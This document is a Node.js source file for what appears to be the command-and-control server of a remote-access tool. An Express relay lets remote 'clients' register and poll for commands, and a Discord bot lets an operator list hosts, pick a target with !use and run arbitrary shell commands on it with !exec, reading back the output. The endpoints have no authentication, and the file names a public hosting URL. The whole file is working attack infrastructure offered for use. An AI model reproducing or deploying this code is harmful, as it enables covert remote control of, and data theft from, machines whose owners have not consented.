const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const { exec, execSync } = require('child_process');
const os = require('os');

const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
    console.error('❌ BOT_TOKEN is missing. Set it in environment variables.');
    process.exit(1);
}

const PREFIX = '!';
const PORT = process.env.PORT || 3000;

const app = express();
app.use(bodyParser.json());

const pendingCommands = {};
const commandResults = {};
let cmdCounter = 0;
const clients = {};

app.post('/register', (req, res) => {
    const { clientId, hostname } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    clients[clientId] = { hostname: hostname || 'Unknown', lastSeen: Date.now() };
    console.log(`📥 New client: ${clientId} (${hostname})`);
    res.json({ status: 'registered' });
});

app.get('/poll/:clientId', (req, res) => {
    const clientId = req.params.clientId;
    if (clients[clientId]) clients[clientId].lastSeen = Date.now();
    const list = pendingCommands[clientId] || [];
    if (list.length === 0) return res.status(204).send();
    const cmdObj = list.shift();
    res.json({ id: cmdObj.id, command: cmdObj.cmd });
});

app.post('/result', (req, res) => {
    const { id, result } = req.body;
    commandResults[id] = result;
    res.json({ status: 'ok' });
});

app.post('/send', (req, res) => {
    const { clientId, command } = req.body;
    if (!clientId || !command) return res.status(400).json({ error: 'Missing data' });
    const id = ++cmdCounter;
    if (!pendingCommands[clientId]) pendingCommands[clientId] = [];
    pendingCommands[clientId].push({ id, cmd: command });
    res.json({ status: 'queued', id });
});

app.get('/result/:id', (req, res) => {
    const result = commandResults[req.params.id];
    if (result) res.json({ result });
    else res.status(404).json({ error: 'Not found' });
});

app.get('/clients', (req, res) => {
    const now = Date.now();
    const online = {};
    for (const [id, data] of Object.entries(clients)) {
        if (now - data.lastSeen < 30000) online[id] = data;
    }
    res.json(online);
});

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const userTargets = new Map();

client.on('messageCreate', async (msg) => {
    if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
    const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    const baseUrl = `http://127.0.0.1:${PORT}`;

    if (cmd === 'list') {
        try {
            const res = await fetch(`${baseUrl}/clients`);
            const data = await res.json();
            const entries = Object.entries(data);
            if (entries.length === 0) return msg.reply('❌ No clients connected.');
            let listMsg = '📡 Connected clients:\n';
            entries.forEach(([id, info]) => {
                listMsg += `🖥️ \`${id}\` (${info.hostname}) - last seen: ${new Date(info.lastSeen).toLocaleTimeString()}\n`;
            });
            listMsg += '\nUse `!use <id>` then `!exec <command>`.';
            await msg.reply(listMsg);
        } catch (err) {
            await msg.reply(`❌ Error: ${err.message}`);
        }
        return;
    }

    if (cmd === 'use') {
        const targetId = args[0];
        if (!targetId) return msg.reply('⚠️ Usage: `!use <id>`');
        try {
            const res = await fetch(`${baseUrl}/clients`);
            const data = await res.json();
            if (!data[targetId]) return msg.reply(`❌ ID not found. Use \`!list\`.`);
            userTargets.set(msg.author.id, targetId);
            await msg.reply(`✅ Selected \`${targetId}\` (${data[targetId].hostname}).`);
        } catch (err) {
            await msg.reply(`❌ Error: ${err.message}`);
        }
        return;
    }

    if (cmd === 'exec') {
        const targetId = userTargets.get(msg.author.id);
        if (!targetId) return msg.reply('⚠️ Select a client first with `!use <id>`.');
        const fullCmd = args.join(' ');
        if (!fullCmd) return msg.reply('Provide a command, e.g., `!exec dir C:\\`');
        try {
            const sendRes = await fetch(`${baseUrl}/send`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId: targetId, command: fullCmd })
            });
            const data = await sendRes.json();
            await msg.reply(`✅ Command sent. ID: \`${data.id}\``);
            await new Promise(r => setTimeout(r, 5000));
            const resultRes = await fetch(`${baseUrl}/result/${data.id}`);
            if (resultRes.ok) {
                const json = await resultRes.json();
                await msg.reply(`📦 **Result:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply(`⏳ Result not ready yet. Use \`!result ${data.id}\` later.`);
            }
        } catch (err) {
            await msg.reply(`❌ Failed: ${err.message}`);
        }
        return;
    }

    if (cmd === 'result') {
        const id = args[0];
        if (!id) return msg.reply('Usage: `!result <id>`');
        try {
            const res = await fetch(`${baseUrl}/result/${id}`);
            if (res.ok) {
                const json = await res.json();
                await msg.reply(`📦 **Result:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply('❌ Result not found.');
            }
        } catch (err) { await msg.reply('Error.'); }
        return;
    }

    if (cmd === 'ping') return msg.reply(`Pong! ${client.ws.ping}ms`);
    if (cmd === 'help') {
        return msg.reply(`📋 Commands:\n\`!list\` – show connected clients\n\`!use <id>\` – select target\n\`!exec <cmd>\` – execute command\n\`!result <id>\` – fetch previous result`);
    }
});

client.once('clientReady', () => {   // تم التصحيح إلى clientReady كما هو مطلوب في v15
    console.log(`✅ Bot logged in as ${client.user.tag}`);
});

client.login(TOKEN).catch(err => {
    console.error('❌ Login error:', err);
    process.exit(1);
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Relay server running on port ${PORT}`);
    console.log(`🌐 Public URL: https://remote-production-b44f.up.railway.app`);
});

// معالجة الأخطاء غير المقبضة لمنع إيقاف الحاوية
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
